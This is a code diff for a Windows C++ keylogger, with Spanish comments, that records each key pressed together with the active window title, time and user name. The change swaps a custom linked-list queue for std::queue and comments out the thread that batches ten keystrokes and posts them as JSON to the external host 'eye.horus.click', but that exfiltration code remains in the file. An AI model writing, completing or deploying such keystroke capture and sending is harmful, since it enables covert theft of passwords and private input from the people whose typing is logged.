@@ -5,6 +5,7 @@
 #include<ctime>
 #include<lmcons.h>
 #include<winhttp.h>
+#include<queue>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -388,57 +389,9 @@ bool TeclasPulsadas(int tecla) {
 	}
 }
 
-//Implementación de la cola
-typedef struct t_node {
-	type_key* key;
-	t_node* next;
-}Node;
-
-typedef struct t_queue {
-	int size;
-	Node* front;
-	Node* tail;
-}Queue;
-
-Node* getNode(type_key* key) {
-	Node* node = (Node*)malloc(sizeof(Node));
-	node->key = key;
-	node->next = NULL;
-	return node;
-}
-
-Queue* getNewQueue() {
-	Queue* q = (Queue*)malloc(sizeof(Queue));
-	q->size = 0;
-	q->front = NULL;
-	q->tail = NULL;
-	return q;
-}
-
-void Enqueue(Queue* q, Node* node) {
-	if (q->front == NULL)	q->front = node;
-	else q->tail->next = node;
-	q->tail = node;
-	q->size++;
-}
-
-type_key* Dequeue(Queue* q) {
-	if (q->size) {
-		type_key* returnValue;
-		Node* aux = q->front;
-		returnValue = aux->key;
-		q->front = q->front->next;
-		free(aux);
-		q->size--;
-		return returnValue;
-	}
-	return NULL;
-}
-
-//--Implementación de la cola--
-
 //Implementación del hilo
 DWORD WINAPI Send_to_WS(LPVOID lpParam) {
+	/*
 	Queue* QUEUE = (Queue*)lpParam;
 	for (int i = 10; i > 0; i--) {
 		type_key* key = Dequeue(QUEUE);
@@ -449,7 +402,7 @@ DWORD WINAPI Send_to_WS(LPVOID lpParam) {
 			"}";
 		string ruta = "/evento/" + str_key.nombre;
 		HttpsWebRequestPost("eye.horus.click", ruta, body);
-	}
+	}*/
 	return 1;
 }
 //--Implementación del hilo--
@@ -457,7 +410,7 @@ DWORD WINAPI Send_to_WS(LPVOID lpParam) {
 int main() {
 	//FreeConsole();
 	unsigned char key;
-	Queue* QUEUE = getNewQueue();
+	queue<tecla> QUEUE;
 
 	//Desplegar Encabezados
 	cout << "Tecla\t\t\t";
@@ -474,22 +427,11 @@ int main() {
 				if (TeclasPulsadas(key) == FALSE) {
 					str_key.key = key;
 
-					Node* a = getNode(&str_key);
-					Enqueue(QUEUE, a);
-
-					//Envío al web service (Ahora se implementa en Send_to_WS)
-					/*
-					string body = "{"
-						"\"Time\":\""+str_key.tiempo+"\","
-						"\"Window\":\""+str_key.ventana+"\","
-						"\"Key\":\""+str_key.key+"\""
-						"}";
-					string ruta = "/evento/" + str_key.nombre;
-					HttpsWebRequestPost("eye.horus.click", ruta, body);
-					*/
+					QUEUE.push(str_key);
 
 					//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
-					if (QUEUE->size == 10) {
+					/*
+					if (QUEUE.size() == 10) {
 						//Variables para el funcionamiento del proceso
 						DWORD dwThreadId;
 						HANDLE hThread;
@@ -498,7 +440,7 @@ int main() {
 							NULL,
 							0,
 							Send_to_WS,
-							QUEUE,
+							&QUEUE,
 							0,
 							&dwThreadId
 						);
@@ -510,7 +452,7 @@ int main() {
 							CloseHandle(hThread);
 						}
 					}
-
+					*/
 					//Impresión de depuración
 					cout << str_key.key + "\t";
 					cout << str_key.ventana + "\t";
@@ -521,5 +463,5 @@ int main() {
 			}
 		}
 	}
-	free(QUEUE);
+	//free(QUEUE);
 }
